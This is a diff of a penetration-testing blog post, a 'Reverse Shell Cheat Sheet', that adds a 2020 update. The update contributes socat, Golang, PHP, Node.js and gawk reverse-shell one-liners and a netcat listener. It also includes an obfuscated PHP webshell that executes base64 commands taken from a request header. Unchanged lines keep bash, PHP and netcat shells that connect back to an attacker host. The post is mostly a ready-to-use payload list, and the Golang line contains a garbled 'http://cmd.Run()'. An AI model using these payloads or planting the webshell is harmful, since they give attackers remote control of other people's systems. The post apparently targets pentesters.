@@ -3,7 +3,7 @@ layout: blog_item
 title:  "Reverse Shell Cheat Sheet"
 date:   2015-03-29 14:37:10
 author: Arr0way
-description: 'Reverse Shell Cheat Sheet, a list of reverse shells for connecting back'
+description: 'Reverse Shell Cheat Sheet - 2020 update, a list of reverse shells for connecting back.'
 categories: [cheat-sheet]
 tags:
 - 'Penetration Testing'
@@ -19,6 +19,9 @@ During penetration testing if you're lucky enough to find a remote command execu
 Below are a collection of **reverse shells** that use commonly installed programming languages, or commonly installed binaries (nc, telnet, bash, etc). At the bottom of the post are a collection of uploadable reverse shells, present in Kali Linux.
 
 If you found this resource usefull you should also check out our [penetration testing tools](/blog/penetration-testing-tools-cheat-sheet/) cheat sheet which has some additional reverse shells and other commands useful when performing penetration testing. 
+
+17/09/2020 - Updated to add the reverse shells submitted via Twitter @JaneScott 
+29/03/2015 - Original post date
 
 ## Setup Listening Netcat
 
@@ -66,6 +69,20 @@ while read line 0<&5; do $line 2>&5 >&5; done
 bash -i >& /dev/tcp/ATTACKING-IP/80 0>&1
 {% endhighlight %}
 
+## socat Reverse Shell
+
+Source: @filip_dragovic
+
+{% highlight bash %}
+socat tcp:ip:port exec:'bash -i' ,pty,stderr,setsid,sigint,sane &
+{% endhighlight %}
+
+## Golang Reverse Shell
+
+{% highlight bash %}
+echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","127.0.0.1:1337");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;http://cmd.Run();}'>/tmp/sh.go&&go run /tmp/sh.go
+{% endhighlight %}
+
 ## PHP Reverse Shell
 
 A useful PHP reverse shell:
@@ -75,9 +92,27 @@ php -r '$sock=fsockopen("ATTACKING-IP",80);exec("/bin/sh -i <&3 >&3 2>&3");'
 (Assumes TCP uses file descriptor 3. If it doesn't work, try 4,5, or 6)
 {% endhighlight %}
 
+Another PHP reverse shell (that was submitted via Twitter):
+
+{% highlight bash %}
+<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/"ATTACKING IP"/443 0>&1'");?>
+{% endhighlight %}
+
+Base64 encrypted by @0xInfection: 
+
+{% highlight bash %}
+<?=$x=explode('~',base64_decode(substr(getallheaders()['x'],1)));@$x[0]($x[1]);
+{% endhighlight %}
+
 ## Netcat Reverse Shell
 
 Useful netcat reverse shell examples:
+
+Don't forget to start your listener, or you won't be catching any shells :) 
+
+{% highlight bash %}
+nc -lnvp 80
+{% endhighlight %}
 
 {% highlight bash %}
 nc -e /bin/sh ATTACKING-IP 80
@@ -90,6 +125,14 @@ nc -e /bin/sh ATTACKING-IP 80
 {% highlight bash %}
 rm -f /tmp/p; mknod /tmp/p p && nc ATTACKING-IP 4444 0/tmp/p
 {% endhighlight %}
+
+## Node.js Reverse Shell
+
+{% highlight bash %}
+require('child_process').exec('bash -i >& /dev/tcp/10.0.0.1/80 0>&1');
+{% endhighlight %}
+
+Source: @jobertabma via @JaneScott 
 
 ## Telnet Reverse Shell
 
@@ -139,6 +182,12 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
 {% endhighlight %}
 
 ## Gawk Reverse Shell
+
+Gawk one liner rev shell by @dmfroberson: 
+
+{% highlight bash %}
+gawk 'BEGIN {P=4444;S="> ";H="192.168.1.100";V="/inet/tcp/0/"H"/"P;while(1){do{printf S|&V;V|&getline c;if(c){while((c|&getline)>0)print $0|&V;close(c)}}while(c!="exit")close(V)}}'
+{% endhighlight %}
 
 {% highlight gawk %}
 #!/usr/bin/gawk -f
